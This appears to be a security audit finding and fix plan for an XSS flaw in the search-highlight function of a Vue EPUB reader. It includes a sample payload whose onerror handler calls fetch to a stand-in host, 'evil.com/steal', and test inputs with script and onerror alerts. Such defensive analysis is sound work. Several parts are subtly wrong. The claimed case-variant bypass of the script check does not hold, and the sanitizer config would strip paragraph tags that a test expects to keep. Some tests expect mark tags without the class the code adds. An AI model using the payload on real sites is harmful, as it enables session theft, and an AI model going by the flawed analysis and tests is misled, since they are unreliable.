# XSS Vulnerability via Search Highlight Function in BookViewer

## Severity
High

## Affected Files
- `src/components/BookViewer.vue:168-236` (highlightSearchText function)

## Description
The `highlightSearchText` function in `BookViewer.vue` processes chapter content to add search highlights by creating DOM elements directly without sanitization. The function creates new DOM elements and sets their `textContent`, which appears safe, but there are several concerns:

```typescript
// Lines 168-236 in BookViewer.vue
function highlightSearchText(html: string, searchText: string): string {
  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const body = doc.body;

  if (!body) return html;

  const regex = new RegExp(`(${escapeRegex(searchText)})`, 'gi');
  const walker = document.createTreeWalker(
    body,
    NodeFilter.SHOW_TEXT,
    null
  );

  const nodesToReplace: { node: Text; parent: Node }[] = [];
  let node: Node | null;

  while ((node = walker.nextNode())) {
    if (node.nodeType === Node.TEXT_NODE) {
      const textNode = node as Text;
      if (regex.test(textNode.textContent || '')) {
        const parent = textNode.parentNode;
        if (parent && parent.nodeName !== 'SCRIPT' && parent.nodeName !== 'STYLE') {
          nodesToReplace.push({ node: textNode, parent });
        }
      }
    }
  }

  let matchCount = 0;
  const targetIndex = bookStore.searchHighlight?.matchIndex ?? 0;

  for (const { node, parent } of nodesToReplace) {
    const matches = (node.textContent || '').matchAll(regex);
    const parts: (string | HTMLElement)[] = [];
    let lastIndex = 0;

    for (const match of matches) {
      if (match.index !== undefined) {
        parts.push(node.textContent!.substring(lastIndex, match.index));
        const mark = document.createElement('mark');
        mark.className = 'search-highlight';
        if (matchCount === targetIndex) {
          mark.classList.add('active');
        }
        mark.textContent = match[0]; // Using textContent - this is SAFE
        parts.push(mark);
        lastIndex = match.index + match[0].length;
        matchCount++;
      }
    }

    if (lastIndex < (node.textContent || '').length) {
      parts.push(node.textContent!.substring(lastIndex));
    }

    const span = document.createElement('span');
    parts.forEach(part => {
      if (typeof part === 'string') {
        span.appendChild(document.createTextNode(part));
      } else {
        span.appendChild(part);
      }
    });
    parent.replaceChild(span, node);
  }

  return body.innerHTML; // UNSAFE: Returns innerHTML that wasn't sanitized
}
```

While the function uses `textContent` which is safe against direct script execution, there are still vulnerabilities:

1. **No Sanitization of Input HTML**: The input `html` is never sanitized before processing
2. **Unsafe innerHTML Return**: The function returns `body.innerHTML` without sanitization
3. **Regex Injection**: The `searchText` is not properly escaped before being used in regex (though `escapeRegex` is called)
4. **Parent Tag Bypass**: The check for SCRIPT/STYLE tags can be bypassed with variations like `<sCrIpt>`

## Potential Attack Vectors
1. **Existing Malicious Content**: If chapter content already contains malicious HTML, it passes through unchanged
2. **Attribute Injection via InnerHTML**: The return value contains all original attributes including event handlers
3. **Mixed Content Attacks**: Malicious content in different parts of the HTML structure
4. **DOM Clobbering**: Form elements with `id` or `name` attributes can clobber JavaScript variables
5. **Case-Insensitive Tag Bypass**: `<ScRiPt>`, `<sCrIpt>`, etc. bypass the simple name check

### Example Attack Scenario
If an EPUB chapter contains:
```html
<div>
  Normal text
  <img src="x" onerror="fetch('https://evil.com/steal')" id="steal">
  <a href="javascript:alert(1)">Click me</a>
</div>
```

When search highlighting is applied, the `innerHTML` returned will contain:
```html
<div>
  Normal text
  <img src="x" onerror="fetch('https://evil.com/steal')" id="steal">
  <a href="javascript:alert(1)">Click me</a>
</div>
```

This is then set to `articleRef.value.innerHTML` in `renderCurrentChapter`, executing the malicious code.

## Implementation Plan

### Step 1: Install DOMPurify (if not already installed)
```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

### Step 2: Create/update sanitization utility
Create `src/utils/sanitize.ts`:
```typescript
import DOMPurify from 'dompurify';

const HIGHLIGHT_CONFIG = {
  ALLOWED_TAGS: ['mark', 'span'],
  ALLOWED_ATTR: ['class'],
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onfocus', 'onblur', 'onsubmit', 'href'],
  KEEP_CONTENT: true,
  FORCE_BODY: false
};

/**
 * Sanitize HTML with highlight marks
 */
export function sanitizeHighlightContent(dirty: string): string {
  return DOMPurify.sanitize(dirty, HIGHLIGHT_CONFIG);
}

/**
 * Escape special regex characters
 */
export function escapeRegex(string: string): string {
  return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}
```

### Step 3: Rewrite highlightSearchText to be completely safe
Update `src/components/BookViewer.vue`:
```typescript
import { escapeRegex, sanitizeHighlightContent } from '@/utils/sanitize';

function highlightSearchText(html: string, searchText: string): string {
  // Step 1: Sanitize input HTML first
  html = sanitizeHighlightContent(html);

  const parser = new DOMParser();
  const doc = parser.parseFromString(html, 'text/html');
  const body = doc.body;

  if (!body) return html;

  // Step 2: Escape regex in search text
  const escapedSearchText = escapeRegex(searchText);
  const regex = new RegExp(`(${escapedSearchText})`, 'gi');

  const walker = document.createTreeWalker(
    body,
    NodeFilter.SHOW_TEXT,
    null
  );

  const nodesToReplace: { node: Text; parent: Node }[] = [];
  let node: Node | null;

  while ((node = walker.nextNode())) {
    if (node.nodeType === Node.TEXT_NODE) {
      const textNode = node as Text;
      const text = textNode.textContent || '';
      if (regex.test(text)) {
        const parent = textNode.parentNode;
        // More robust check - ensure parent is an element and safe
        if (parent && 
            parent.nodeType === Node.ELEMENT_NODE && 
            !(parent as Element).tagName.match(/^(script|style|noscript|iframe|object|embed)$/i)) {
          nodesToReplace.push({ node: textNode, parent });
        }
      }
    }
  }

  let matchCount = 0;
  const targetIndex = bookStore.searchHighlight?.matchIndex ?? 0;

  for (const { node, parent } of nodesToReplace) {
    const text = node.textContent || '';
    const matches = text.matchAll(regex);
    const parts: (string | HTMLElement)[] = [];
    let lastIndex = 0;

    for (const match of matches) {
      if (match.index !== undefined) {
        // Add text before match
        const beforeText = text.substring(lastIndex, match.index);
        if (beforeText) {
          parts.push(document.createTextNode(beforeText));
        }

        // Create highlighted mark element
        const mark = document.createElement('mark');
        mark.className = 'search-highlight';
        if (matchCount === targetIndex) {
          mark.classList.add('active');
        }
        // Use textContent - safe from XSS
        mark.textContent = match[0];
        parts.push(mark);

        lastIndex = match.index + match[0].length;
        matchCount++;
      }
    }

    // Add remaining text
    if (lastIndex < text.length) {
      const afterText = text.substring(lastIndex);
      if (afterText) {
        parts.push(document.createTextNode(afterText));
      }
    }

    // Reconstruct parent with new content
    const span = document.createElement('span');
    parts.forEach(part => {
      span.appendChild(part);
    });
    parent.replaceChild(span, node);
  }

  // Step 3: Sanitize the result before returning
  return sanitizeHighlightContent(body.innerHTML);
}
```

### Step 4: Update renderCurrentChapter to always sanitize
```typescript
function renderCurrentChapter() {
  if (!articleRef.value || !bookStore.currentBook) return;

  const chapter = bookStore.chapters[bookStore.currentChapter];
  if (!chapter) {
    const safeContent = sanitizeHighlightContent('<p class="text-center text-gray-500 dark:text-gray-400">No chapter content available.</p>');
    articleRef.value.innerHTML = safeContent;
    return;
  }

  let content = chapter.content || '<p class="text-center text-gray-500 dark:text-gray-400">Empty chapter.</p>';

  // Always sanitize base content first
  content = sanitizeHighlightContent(content);

  if (bookStore.searchHighlight && bookStore.searchHighlight.chapterIndex === bookStore.currentChapter) {
    content = highlightSearchText(content, bookStore.searchHighlight.searchText);
  }

  articleRef.value.innerHTML = content;

  if (!hasRestoredScrollPosition && bookStore.currentScrollPosition > 0) {
    containerRef.value!.scrollTop = bookStore.currentScrollPosition;
    hasRestoredScrollPosition = true;
  }

  if (bookStore.searchHighlight && bookStore.searchHighlight.chapterIndex === bookStore.currentChapter) {
    nextTick(() => scrollToFirstHighlight());
  }
}
```

### Step 5: Remove or secure the old escapeRegex function
Remove the duplicate `escapeRegex` function since it's now in the utility:
```typescript
// Remove this function from BookViewer.vue (line 249-251)
// function escapeRegex(string: string): string {
//   return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
// }
```

### Step 6: Add comprehensive tests
Create `tests/highlight-sanitize.test.ts`:
```typescript
import { describe, it, expect } from 'vitest';
import { highlightSearchText } from '@/components/BookViewer.vue'; // Adjust import as needed

describe('highlightSearchText', () => {
  it('should add mark tags around matches', () => {
    const html = '<p>This is test content</p>';
    const result = highlightSearchText(html, 'test');
    expect(result).toContain('<mark>test</mark>');
  });

  it('should remove script tags from input', () => {
    const html = '<p>Content<script>alert("XSS")</script></p>';
    const result = highlightSearchText(html, 'content');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('alert');
  });

  it('should remove event handlers', () => {
    const html = '<p>Content<img src=x onerror="alert(1)"></p>';
    const result = highlightSearchText(html, 'content');
    expect(result).not.toContain('onerror');
  });

  it('should handle case-insensitive matching', () => {
    const html = '<p>TEST content</p>';
    const result = highlightSearchText(html, 'test');
    expect(result).toContain('<mark>TEST</mark>');
  });

  it('should escape special regex characters', () => {
    const html = '<p>Price: $10.50</p>';
    const result = highlightSearchText(html, '$10');
    expect(result).toContain('<mark>$10</mark>');
  });

  it('should not highlight inside script tags', () => {
    const html = '<p>test</p><script>test</script>';
    const result = highlightSearchText(html, 'test');
    const pMatch = result.match(/<mark>test<\/mark>/g);
    expect(pMatch?.length).toBe(1); // Only one highlight
  });

  it('should handle empty search text', () => {
    const html = '<p>Content</p>';
    const result = highlightSearchText(html, '');
    expect(result).toContain('<p>Content</p>');
  });
});
```

### Step 7: Add CSS for highlights
Ensure the search highlight styles are defined:
```css
/* Add to your CSS file */
.search-highlight {
  background-color: #fef08a;
  border-radius: 2px;
  padding: 1px 2px;
}

.search-highlight.active {
  background-color: #facc15;
  animation: pulse 1s ease-in-out infinite;
}

@keyframes pulse {
  0%, 100% { opacity: 1; }
  50% { opacity: 0.7; }
}

/* Dark mode support */
.dark .search-highlight {
  background-color: #854d0e;
  color: #fef3c7;
}

.dark .search-highlight.active {
  background-color: #a16207;
}
```

## Additional Security Recommendations
1. **Rate Limit Search**: Prevent DoS by rate limiting search operations
2. **Limit Search Result Size**: Prevent memory issues with large result sets
3. **Debounce Search Input**: Already implemented in SearchPanel.vue, but verify timing
4. **Sanitize at Source**: Sanitize EPUB content when loading, not just when displaying
5. **Use Virtual DOM**: Consider using Vue's virtual DOM instead of manual DOM manipulation
6. **Add CSP**: Implement Content Security Policy headers

## Related Issues
- See also: `xss-via-unsafe-innerhtml-bookviewer.md` (BookViewer sanitization)
- See also: `xss-via-unsafe-epub-content-useepub.md` (EPUB content sanitization)
- See also: `missing-content-security-policy.md` (CSP implementation)
